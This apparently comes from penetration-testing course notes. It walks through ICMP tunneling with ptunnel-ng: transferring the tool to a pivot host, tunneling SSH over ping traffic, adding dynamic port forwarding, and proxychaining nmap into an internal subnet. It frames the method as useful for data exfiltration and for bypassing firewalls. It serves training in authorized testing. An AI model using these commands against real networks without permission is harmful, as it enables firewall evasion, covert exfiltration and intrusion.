ICMP tunneling encapsulates your traffic within `ICMP packets` containing `echo requests` and `responses`. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.

We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host. Let's start by setting up ptunnel-ng.

## Setting Up & Using ptunnel-ng
We can find the binary in `/opt/ptunnel-ng/src/`

 As in previous sections, we can use SCP to transfer the files. If we want to transfer the entire repo and the files contained inside, we will need to use the `-r` option with SCP.

#### Transferring Ptunnel-ng to the Pivot Host
```shell-session
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```
With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.
**!!** Here we copy the entire directory to host.
#### Starting the ptunnel-ng Server on the Target Host
```shell
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
```

The IP address following `-r` should be the IP of the jump-box we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking & consideration during an actual engagement.

Back on the attack host, we can attempt to connect to the ptunnel-ng server (`-p <ipAddressofTarget>`) but ensure this happens through local port 2222 (`-l2222`). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

#### Connecting to ptunnel-ng Server from Attack Host
```shell
 sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```
With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (`-p2222`).

#### Tunneling an SSH connection through an ICMP Tunnel
```shell
ssh -p2222 -lubuntu 127.0.0.1
```

If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.

On the client & server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.
We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

#### Enabling Dynamic Port Forwarding over SSH
```shell
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.
#### Proxychaining through the ICMP Tunnel
```shell
proxychains nmap -sV -sT 172.16.5.19 -p3389
```


